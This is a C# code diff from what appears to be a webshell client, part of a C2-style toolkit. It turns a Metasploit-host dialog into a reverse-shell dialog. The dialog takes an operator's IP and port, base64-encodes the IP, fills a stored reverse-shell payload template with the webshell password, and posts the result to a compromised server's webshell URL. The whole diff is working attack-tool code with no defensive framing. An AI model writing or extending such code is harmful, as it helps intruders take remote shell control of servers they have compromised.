@@ -6,51 +6,54 @@ using System.Threading.Tasks;
 
 namespace C2.Business.CastleBravo.WebShellTool
 {
-    partial class MSFSet : StandardDialog
+    partial class ReverseShellSet :  StandardDialog
     {
-        private string MSF { get => msfTextBox.Text.Trim(); set => msfTextBox.Text = value; }
         private readonly WebShellTaskConfig task;
         private ProxySetting proxy;
-        public MSFSet(WebShellTaskConfig taskConfig, ProxySetting proxy)
+        public ReverseShellSet(WebShellTaskConfig taskConfig, ProxySetting proxy)
         {
             InitializeComponent();
             task = taskConfig;
             this.proxy = proxy;
-            MSF = Global.MSFHost;
+            rshTextBox.Text = Global.ReverseShellHost;
         }
+
         protected override bool OnOKButtonClick()
         {
-            if (MSF.IsNullOrEmpty())
+            string rsh = rshTextBox.Text.Trim();
+            if (rsh.IsNullOrEmpty())
             {
-                HelpUtil.ShowMessageBox("【MSF地址】不能为空。");
+                HelpUtil.ShowMessageBox("【反弹地址】不能为空。");
                 return false;
             }
-            string RegexStr = @"((\d{1,3}\.){3}\d{1,3}):(\d{3,5})";
-            Match mc = Regex.Match(MSF.Trim(), RegexStr);
+
+            Match mc = Regex.Match(rsh, @"((\d{1,3}\.){3}\d{1,3}):(\d{1,5})");
             
-            if (mc.Groups.Count < 3)
+            if (!mc.Success)
             {
-                HelpUtil.ShowMessageBox("【MSF地址】格式有误。");
+                HelpUtil.ShowMessageBox("【反弹地址】格式有误。");
                 return false;
             }
-            Global.MSFHost = MSF;
+            Global.ReverseShellHost = rsh;
             string encodeIP = ST.EncodeBase64(mc.Groups[1].Value);
             string port = mc.Groups[3].Value;
-            string payload = string.Format(Global.MSFPayload, task.Password, port, encodeIP);
+            string payload = string.Format(Global.ReverseShellPayload, task.Password, port, encodeIP);
             Task<string> t = Task.Run(() => PostPayload(payload));
             return base.OnOKButtonClick();
         }
+
+
         private string PostPayload(string payload)
         {
-            try 
-            { 
+            try
+            {
                 return WebClientEx.Post(NetUtil.FormatUrl(task.Url), payload, 900000, proxy);
             }
             catch
             {
                 return string.Empty;
             }
-            
+
         }
     }
 }
